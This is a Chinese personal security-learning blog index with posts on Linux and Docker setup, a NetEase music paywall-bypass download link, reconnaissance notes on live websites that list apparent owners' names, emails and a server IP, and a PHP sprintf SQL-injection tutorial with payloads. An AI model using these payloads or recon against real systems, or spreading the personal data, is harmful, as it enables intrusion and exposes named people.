<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>可乐&#39;blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="只会复现的菜鸡">
<meta property="og:type" content="website">
<meta property="og:title" content="可乐&#39;blog">
<meta property="og:url" content="https://style-404.github.io/index.html">
<meta property="og:site_name" content="可乐&#39;blog">
<meta property="og:description" content="只会复现的菜鸡">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="可乐&#39;blog">
<meta name="twitter:description" content="只会复现的菜鸡">
  
    <link rel="alternate" href="/atom.xml" title="可乐&#39;blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">可乐&#39;blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://style-404.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-网易云音乐免费下载" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/17/网易云音乐免费下载/" class="article-date">
  <time datetime="2019-05-17T05:29:04.000Z" itemprop="datePublished">2019-05-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/17/网易云音乐免费下载/">网易云音乐免费下载</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天想剪音乐,于是将下载的ncm格式转换为MP3格式，但是觉得有点麻烦，于是在网上学到了另一个方法,可以直接下载MP3格式,包括免费下载收费歌曲</p>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>第一步</p>
<p>打开网易云音乐，随便找到一首歌，播放，复制网址的ID<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g349adfe3pj30wd0gmdju.jpg" alt=""></p>
<p>第二步<br>输入:<a href="http://music.163.com/song/media/outer/url?id=1344202958.mp3" target="_blank" rel="noopener">http://music.163.com/song/media/outer/url?id=1344202958.mp3</a></p>
<p>这里的1344202958就是歌曲的ID,如果要下别的歌曲 ，只需要替换id即可</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g349cyo3i3j30ul0g8aan.jpg" alt=""><br>然后点击右键,另存为音频即可</p>
<p>利用外链,此方法长期有效,有空可以写个小工具来,hhh~</p>
<p>希望有帮助~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/05/17/网易云音乐免费下载/" data-id="cjvrp4gly00315gqrc6lukd80" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-linux学习笔记" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/11/linux学习笔记/" class="article-date">
  <time datetime="2019-05-10T18:16:08.000Z" itemprop="datePublished">2019-05-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/11/linux学习笔记/">linux学习笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>休夸此地分天下<br>linux启动http服务<br>1、安装apache</p>
<p>yum install httpd #根据提示，输入Y安装即可成功安装</p>
<p>systemctl start httpd.service #启动apache</p>
<p>systemctl stop httpd.service #停止apache</p>
<p>systemctl restart httpd.service #重启apache</p>
<p>systemctl enable httpd.service #设置apache开机启动</p>
<p>2、启动http服务</p>
<p>httpd -version #检查是否安装</p>
<p>yum install httpd #安装http服务</p>
<p>service httpd start #启动http服务</p>
<p>service httpd status #检查http服务状态（会显示绿色的active(running)表示启动成功）</p>
<p>service httpd restart #重启http服务</p>
<p>3、配置文件</p>
<p>httpd相关配置文件：</p>
<p>主配置文件：/etc/httpd/conf/httd.conf ，这个是httpd最主要的配置文档</p>
<p>扩展配置文件：<code>/etc/httpd/conf.d/*.conf</code> ，这个是httpd的额外配置文档</p>
<p>文档根目录： /var/www/html ，这个是apache 首页的文档目录 ，即输入<a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a>  显示页面所在的目录</p>
<p>服务脚本：/etc/rc.d/init.d/httpd</p>
<p>错误目录：/var/www/error  ，服务器设定错误，请求的资源错误或浏览器访问出现错误等错误文件的存储目录</p>
<p>CGI目录： /var/www/cgi-bin/   ，预设为CGI运行脚本的存储目录</p>
<p>日志目录：/var/log/httpd  ，client端登录httpd时，记录的登录日志等信息存储目录</p>
<p>脚本配置文件： /etc/sysconfig/httpd</p>
<p>Listen端口：80/tcp  ,443/tcp</p>
<p>命令执行文件：/usr/sbin/apachectl ，/usr/sbin/httpd，/usr/bin/htpasswd</p>
<p>PID文件：/var/run/httpd/httpd.pid</p>
<p>4、开放80端口 打开防火墙</p>
<p>查看指定区域所有开启的端口号</p>
<p>firewall-cmd –zone=public –list-ports</p>
<p>在指定区域开启端口(如80端口号，命令方式)</p>
<p>firewall-cmd –zone=public –add-port=80/tcp –permanent</p>
<p>重新启动防火墙</p>
<p>firewall-cmd –reload</p>
<p>参考网址：<a href="https://blog.csdn.net/u014079773/article/details/79745819" target="_blank" rel="noopener">https://blog.csdn.net/u014079773/article/details/79745819</a></p>
<p>5、测试网页</p>
<p>echo “This is my first web page.”&gt;/var/www/html/index.html</p>
<p>打开<a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> 查看是否正常启动</p>
<p>yum install php</p>
<p>yum install mariadb-server mariadbsystemctl start mariadb<br>启动mariadbsystemctl enable mariadb 设置为开机启动</p>
<p><strong>目前无法处理此请求。</strong><br>在/ect/php.ini<br>将下值由Off 变更为 On<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">display_errors</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">display_startup_errors</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/05/11/linux学习笔记/" data-id="cjvrp4gj600155gqrzoellq45" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-docker学习" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/11/docker学习/" class="article-date">
  <time datetime="2019-05-10T17:33:56.000Z" itemprop="datePublished">2019-05-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/11/docker学习/">docker学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>查看</strong><br>docker ps: 查看当前运行的容器</p>
<p>docker ps -a:查看所有容器，包括停止的。</p>
<p><strong>启动</strong></p>
<p>容器名：docker start docker_run，</p>
<p>或者ID：docker start 43e3fef2266c</p>
<p><strong>终止</strong><br>docker stop [NAME]/[CONTAINER ID]:将容器退出。<br>docker kill [NAME]/[CONTAINER ID]:强制停止一个容器。</p>
<p><strong>删除</strong></p>
<p>docker rm [NAME]/[CONTAINER ID]:不能够删除一个正在运行的容器，会报错。需要先停止容器。</p>
<h1 id="修改docker容器端口映射"><a href="#修改docker容器端口映射" class="headerlink" title="修改docker容器端口映射"></a>修改docker容器端口映射</h1><p>docker ps: 查看当前运行的容器</p>
<p>停止docker服务(systemctl stop docker)</p>
<p>修改这个容器的hostconfig.json文件中的端口<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /var/<span class="class"><span class="keyword">lib</span>/<span class="title">docker</span>/<span class="title">containers</span>/3<span class="title">b6ef264a040</span>* <span class="comment">#这里是CONTAINER ID</span></span></span><br><span class="line">vi hostconfig.json</span><br><span class="line">如果之前没有端口映射, 应该有这样的一段:</span><br><span class="line"><span class="string">"PortBindings"</span>:&#123;&#125;</span><br><span class="line">增加一个映射, 这样写:</span><br><span class="line"><span class="string">"PortBindings"</span>:&#123;<span class="string">"3306/tcp"</span>:[&#123;<span class="string">"HostIp"</span>:<span class="string">""</span>,<span class="string">"HostPort"</span>:<span class="string">"3307"</span>&#125;]&#125;</span><br><span class="line">前一个数字是容器端口, 后一个是宿主机端口.</span><br><span class="line">而修改现有端口映射更简单, 把端口号改掉就行.</span><br></pre></td></tr></table></figure></p>
<p>如果config.v2.json里面也记录了端口，也要修改<br>启动docker服务(systemctl start docker)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/05/11/docker学习/" data-id="cjvrp4gj400125gqrp56tvx8g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-test" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/08/test/" class="article-date">
  <time datetime="2019-05-08T14:56:43.000Z" itemprop="datePublished">2019-05-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/08/test/">test</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>目标站:<a href="http://www.dnfzhushou3.cn" target="_blank" rel="noopener">www.dnfzhushou3.cn</a><br>发现有cdn<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ubcgox0hj30n20g2q96.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8qym5r7j30qc0en3zs.jpg" alt=""><br>王健鹏<br><a href="mailto:3110582594@qq.com" target="_blank" rel="noopener">3110582594@qq.com</a>    邮箱进行反查<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8rq89p4j30yr0bgq49.jpg" alt=""></p>
<p><a href="http://www.dnfzhushou3.cn" target="_blank" rel="noopener">www.dnfzhushou3.cn</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u94c5gqhj30rf083dgi.jpg" alt=""><br>jjkioop3.cn    真实ip(47.112.26.26)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u96t0pysj30sa09uq3s.jpg" alt=""><br>hgjfde.cn<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9br86o8j30rk079t95.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8wtfmurj30ri0g475r.jpg" alt=""></p>
<p><a href="http://www.97dounai.cn（也加了cdn）" target="_blank" rel="noopener">www.97dounai.cn（也加了cdn）</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9cuskk5j30sk07wmxu.jpg" alt=""><br>黄莉<br><a href="mailto:851945109@qq.com" target="_blank" rel="noopener">851945109@qq.com</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u8yt4bwfj30vs0fpjt6.jpg" alt=""></p>
<p>输入<a href="http://www.97dounai.cn" target="_blank" rel="noopener">www.97dounai.cn</a> 会跳到<a href="https://www.gofuncoin.com/（也加了cdn）" target="_blank" rel="noopener">https://www.gofuncoin.com/（也加了cdn）</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9f6bhclj30s707mwf6.jpg" alt=""></p>
<p>对<a href="https://www.gofuncoin.com/进行指纹识别" target="_blank" rel="noopener">https://www.gofuncoin.com/进行指纹识别</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9iyep48j30xw0fot9b.jpg" alt=""></p>
<p><a href="http://www.97dounai.cn" target="_blank" rel="noopener">www.97dounai.cn</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2u9y70dqxj30rf08dgml.jpg" alt=""></p>
<p>对<a href="https://www.gofuncoin.com/，www.dnfzhushou3.cn" target="_blank" rel="noopener">https://www.gofuncoin.com/，www.dnfzhushou3.cn</a> 进行子域名爆破 无果~</p>
<p>利用国外ping，dns解析记录绕cdn 无果~</p>
<p>现在从<a href="http://www.gofuncoin.com使用框架看看" target="_blank" rel="noopener">www.gofuncoin.com使用框架看看</a>~<br>thinkcmf是开源框架 ，基于thinkphp<br>github:<a href="https://github.com/thinkcmf/thinkcmf" target="_blank" rel="noopener">https://github.com/thinkcmf/thinkcmf</a></p>
<p>找到后台地址: <a href="https://www.gofuncoin.com/index.php?g=admin&amp;m=public&amp;a=login" target="_blank" rel="noopener">https://www.gofuncoin.com/index.php?g=admin&amp;m=public&amp;a=login</a><br>查看源码:<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2ucp4p9p9j31160fegn3.jpg" alt=""><br>发现这个网站可能与云豹直播有关</p>
<p>以后再写~~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/05/08/test/" data-id="cjvrp4gk800195gqrednfxsif" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP-sprintf格式化字符串漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/19/PHP-sprintf格式化字符串漏洞/" class="article-date">
  <time datetime="2019-04-19T07:30:29.000Z" itemprop="datePublished">2019-04-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/19/PHP-sprintf格式化字符串漏洞/">PHP sprintf格式化字符串漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g281m9qmayj30d605omxg.jpg" alt=""></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>sprintf()<br>把百分号（%）符号替换成一个作为参数进行传递的变量：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$number = <span class="number">2</span>;</span></span><br><span class="line"><span class="php">$str = <span class="string">"Shanghai"</span>;</span></span><br><span class="line"><span class="php">$txt = sprintf(<span class="string">"There are %u million cars in %s."</span>,$number,$str);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are <span class="number">2</span> million cars <span class="keyword">in</span> Shanghai.</span><br></pre></td></tr></table></figure></p>
<p>定义和用法<br>sprintf() 函数把格式化的字符串写入变量中。</p>
<p>arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p>
<p>注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “\$” 组成。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$number = <span class="number">123</span>;</span></span><br><span class="line">$txt = sprintf("带有两位小数：%1\$.2f</span><br><span class="line"><span class="php">&lt;br&gt;不带小数：%<span class="number">1</span>\$u<span class="string">",$number);</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>结果:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带有两位小数：<span class="number">123.00</span></span><br><span class="line">不带小数：<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>接下来看看sprintf()的底层实现方法<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (format[inpos]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        zend_string * t;</span><br><span class="line">        zend_string * <span class="built_in">str</span> = zval_get_tmp_string(tmp, &amp;t);</span><br><span class="line">        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(<span class="built_in">str</span>), <span class="built_in">width</span>, precision, padding, alignment, ZSTR_LEN(<span class="built_in">str</span>), <span class="number">0</span>, expprec, <span class="number">0</span>);</span><br><span class="line">        zend_tmp_string_release(t);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, always_sign);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'g'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'G'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'f'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), <span class="built_in">width</span>, padding, alignment, precision, adjusting, format[inpos], always_sign);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, (<span class="built_in">char</span>) zval_get_long(tmp));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">3</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'x'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">4</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'X'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">4</span>, HEXCHARS, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">1</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, <span class="string">'%'</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：<br>如果我们输入<code>&quot;%\&quot;</code>或者<code>&quot;%1$\&quot;</code>,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么<code>&quot;%\&quot;</code>,<code>&quot;%1$\&quot;</code>就因为没有经过任何处理而被替换为空。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27znox1u3j30ql0gnq3s.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27zuu2rx9j30qr0fd3z8.jpg" alt=""></p>
<p>因此sprintf注入的原理就是</p>
<p>我们用一个15种类型之外的 <code>&quot;\&quot;</code>来代替格式字符类型让函数替换为空，则“%1$\’”后面的单引号就能闭合前面的单引号，以下是一些例子帮助我们更好的理解</p>
<p><strong>不带占位符的</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$sql=<span class="string">"select * from user where username='%\' and 1=1 #';"</span>;</span></span><br><span class="line"><span class="php">$user=<span class="string">'admin'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> sprintf($sql,$user);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#';</span></span><br></pre></td></tr></table></figure></p>
<p>注意：username=’’这里是两个单引号不是双引号</p>
<p><strong>带有占位符：</strong><br>先看不带的原样输出<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280cueav7j30v60h6406.jpg" alt=""><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="attribute">1</span>=1#</span><br><span class="line"><span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">'and 1=1#'</span></span><br><span class="line">SELECT * <span class="keyword">FROM</span> t WHERE <span class="attribute">a</span>=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">'and 1=1#'</span></span><br></pre></td></tr></table></figure></p>
<p>进行绕过<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（<span class="string">'），双引号（"），反斜杠（\），NULL</span></span><br><span class="line"><span class="string">$input = addslashes ("%1$'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#" );</span></span><br><span class="line">$b = <span class="keyword">sprintf</span> (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br><span class="line">echo  $sql ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>对$input与$b进行了拼接<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM t WHERE a='%s' AND b='%1$\' and 1=1#' "</span>, <span class="string">'admin'</span> );</span><br></pre></td></tr></table></figure></p>
<p>很明显，这个句子里面的<code>\</code>是由addsashes为了转义单引号而加上的，使用%s与<code>%1$\</code>类匹配admin，那么admin只会出现在%s里，<code>%1$\</code>为空<br>所以输出<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$\' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">AND</span> b='%<span class="number">1</span>$\' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#'</span></span><br><span class="line"><span class="built_in">SELECT</span> * FROM t <span class="built_in">WHERE</span> a='admin' <span class="keyword">AND</span> b='' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280l04clnj30x70hjgn1.jpg" alt=""><br>对于这个问题，我们还可以这样写<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM table WHERE a='%1$\' AND b='%d' and 1=1#' "</span>,<span class="string">'admin'</span>);</span><br></pre></td></tr></table></figure></p>
<p>result:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> t WHERE <span class="attribute">a</span>=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="attribute">1</span>=1#'</span><br></pre></td></tr></table></figure></p>
<p>第一个格式化处匹配时为空，会让给后面的格式化匹配</p>
<p>以上两个例子是吃掉’\’来使得单引号逃逸出来</p>
<p>下面这个例子我们构造单引号<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span></span><br><span class="line"><span class="php">$input2 = <span class="number">39</span> ;</span></span><br><span class="line"><span class="php">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($sql.<span class="string">"&lt;br&gt;"</span>);</span></span><br><span class="line"><span class="php">$sql = sprintf ( $sql , $input2 );</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>  $sql ;</span></span><br></pre></td></tr></table></figure></p>
<p>结果：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">' %1$c) OR 1 = 1 /* '</span>) <span class="keyword">AND</span> baz = %s</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">' '</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/* ') AND baz = 39</span></span><br></pre></td></tr></table></figure></p>
<p>%c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。</p>
